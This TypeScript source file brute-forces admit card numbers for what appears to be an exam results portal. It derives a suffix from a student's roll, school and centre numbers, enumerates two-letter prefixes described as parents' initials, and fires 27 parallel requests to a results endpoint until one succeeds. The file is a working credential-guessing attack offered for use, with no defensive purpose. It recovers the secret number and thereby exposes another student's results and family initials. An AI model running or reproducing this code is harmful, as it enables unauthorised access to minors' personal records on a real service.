import { parallel, selectFirst } from "radashi";
import { fetchResults } from "./fetchResults";
import { generateAdmitCardNumber } from "./generateAdmitCardNumber";
export type GeneratePotentialAdmitCardNumbersProps = {
    school_number: string;
    centre_number: string;
    roll_number: string;
    known_father?: string;
    known_mother?: string;
};

console.log(Map.prototype.getOrInsertComputed);
const permutationCache = new Map<string, string[]>();
const letters = "ABDEFGHIJKLMNOPQRSTUVWXYZ";
function generateLetterPermutations(knownLetter?: string, location?: "father" | "mother"): string[] {
    const key = `$${knownLetter}${location}`;
    return permutationCache.getOrInsertComputed(key, () => {
        const permutations: string[] = [];
        switch (location) {
            case "father": {
                for (const letter of letters) {
                    permutations.push(knownLetter + letter);
                }
                break;
            }
            case "mother": {
                for (const letter of letters) {
                    permutations.push(letter + knownLetter);
                }
                break;
            }
            default: {
                for (const letter1 of letters) {
                    for (const letter2 of letters) {
                        permutations.push(letter1 + letter2);
                    }
                }
            }
        }
        return permutations;
    });
}
export function generatePotentialAdmitCardNumbers({
    centre_number,
    roll_number,
    school_number,
    known_father,
    known_mother,
}: GeneratePotentialAdmitCardNumbersProps) {
    let permutations: string[];
    if (known_father) {
        permutations = generateLetterPermutations(known_father, "father");
    } else if (known_mother) {
        permutations = generateLetterPermutations(known_mother, "mother");
    } else {
        permutations = generateLetterPermutations();
    }

    const half = centre_number.length / 2 - 1;
    const suffix = (
        roll_number.slice(-2) +
        school_number.slice(0, 2) +
        centre_number.slice(half, half + 2)
    ).toUpperCase();

    return permutations.map((prefix) => prefix + suffix);
}

type BruteForceParentsNameProps = GeneratePotentialAdmitCardNumbersProps;

export async function bruteForceParentsName(props: BruteForceParentsNameProps): Promise<string | null> {
    const potentialAdmCardNumbers = generatePotentialAdmitCardNumbers(props);
    const tries = await parallel(27, potentialAdmCardNumbers, async (admCardNumber) => {
        try {
            console.log(`->> Trying ${admCardNumber}`);
            void (await fetchResults({ admitnumber: admCardNumber, rollnumber: props.roll_number }));
            return admCardNumber;
        } catch {
            return undefined;
        }
    });

    const admCardNumber = selectFirst(tries, (s) => s);
    return admCardNumber ?? null;
}
